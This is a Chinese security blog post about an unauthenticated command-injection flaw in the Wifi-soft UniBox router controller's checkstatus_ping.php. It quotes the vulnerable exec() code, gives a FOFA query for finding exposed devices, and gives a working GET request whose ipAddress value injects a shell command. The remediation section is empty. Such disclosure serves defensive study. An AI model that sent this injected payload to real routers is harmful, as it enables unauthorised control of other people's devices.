---
title: "Unibox路由器 network/checkstatus_ping.php 命令执行漏洞"
source: https://mrxn.net/jswz/unibox-network-checkstatus_ping-rce.html
asset_dir: assets/unibox路由器-networkcheckstatus_ping.php-命令执行漏洞
---

# Unibox路由器 network/checkstatus\_ping.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/1 08:29
- 1226浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

路由器

服务器

计算机安全

---

# 漏洞简介

Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/network/checkstatus_ping.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。

网络设备

# 影响版本

# fofa语法

> `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`

# 漏洞分析

深入探索

文本剥离工具

JSON处理工具

Windows安全工具

直接看 `/network/checkstatus_ping.php` 的业务实现造成漏洞的关键部分如下

```
$ipAddress = $_REQUEST['ipAddress'];

function ping($ipAddress) {

    exec("/bin/ping -w 3 $ipAddress -q >/dev/null 2>/dev/null",$output, $result);

        if($result != 0) {
            return 0;
        }
        else {
            return 1;
        }
}

$response = ping($ipAddress);
```

深入探索

编码转换工具

数据库

服务器安全服务

直接将 `ipAddress` 的值拼接进 `exec` 命令中执行，无任何过滤和校验，因此造成[命令执行](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

> 支持cookie获取参数，注意检测点，别漏
>
> 网络监控与管理

```
GET /network/checkstatus_ping.php?ipAddress=;set>11.txt; HTTP/1.1
Host: unibox.mrxn.net
```

访问命令执行结果文件 `/network/11.txt`

[![Unibox路由器 network/checkstatus_ping.php 命令执行漏洞](images/img-001-808b96116db6.webp)](https://image.mrxn.net/f73465e16cdb4c748a5ac78eb715e93e.webp)

成功获得 `set` 命令执行的结果

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

计算机服务器
